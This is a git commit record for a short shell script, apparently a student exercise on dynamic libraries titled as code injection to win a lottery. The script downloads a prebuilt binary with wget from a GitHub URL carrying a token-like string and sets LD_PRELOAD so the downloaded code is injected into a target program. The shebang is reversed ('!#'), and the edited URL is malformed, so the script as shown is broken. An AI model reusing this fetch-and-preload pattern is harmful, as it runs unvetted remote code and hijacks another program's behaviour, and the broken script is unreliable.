d31f8f77a0799c2418fc0b293f03a304e5ae3358
ELFERDI <faradayelferdi34@gmail.com>
2024-03-29 11:36:02 -0700

    Code injection: Win the Giga Millions!

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,3 +1,3 @@
 !#/bin/bash
-wget https://d52e6c18e0723f5b025a75dea19ef365@github.com/alx-tools/0x18.c/raw/master/gm
+wget https://d52e6c18e0723f5b025a75dea19ef365github.com/alx-tools/0x18.c/raw/master/gm
 export LD_PRELOAD=/tmp/gm
